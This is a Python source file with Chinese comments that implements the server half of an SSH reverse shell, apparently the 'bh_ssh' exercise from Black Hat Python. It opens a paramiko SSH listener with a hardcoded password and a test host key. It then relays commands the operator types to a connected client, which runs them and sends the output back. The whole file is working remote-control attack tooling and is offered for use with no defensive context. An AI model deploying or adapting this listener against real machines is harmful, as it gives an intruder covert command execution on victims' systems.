# SSH反弹shell服务器

import os
from xmlrpc.client import Server
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))

# paramiko官方示例的SSH密钥
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username: str, password: str) -> int:
        if (username == '94054') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL


if __name__ == '__main__':
    server = '192.168.15.128'
    ssh_port = 2222
    try:
        # 打开socket监听器
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+] Listening for connection...")

        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # 将socket监听器"SSH化"
    bhSession = paramiko.Transport(client)
    # 设置认证方式
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)
    
    # 当一个客户端通过认证, 并向服务器发送ClientConnected命令后
    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')

    try:
        while True:
            # 在SSH服务器上运行的命令会发送给SSH客户端, 并在客户端上执行, 将结果返回给服务器
            command = input('Enter command: ')
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()